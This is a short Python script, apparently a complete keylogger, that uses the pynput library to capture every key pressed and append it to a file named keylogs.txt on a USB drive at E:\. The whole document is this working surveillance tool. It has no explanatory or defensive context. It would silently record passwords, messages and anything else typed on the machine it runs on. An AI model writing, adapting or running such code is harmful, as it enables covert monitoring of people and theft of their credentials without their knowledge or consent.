from pynput import keyboard
import os

USB_DRIVE = "E:\\"
LOG_FILE = "keylogs.txt"
LOG_PATH = os.path.join(USB_DRIVE, LOG_FILE)

def write_log(key):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as file:
            file.write(key + "\n")
    except Exception as e:
        print(f"Error writing log: {e}")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char)
        else:
            write_log(f" [{str(key)}] ")
    except Exception as e:
        print(f"Error logging key: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
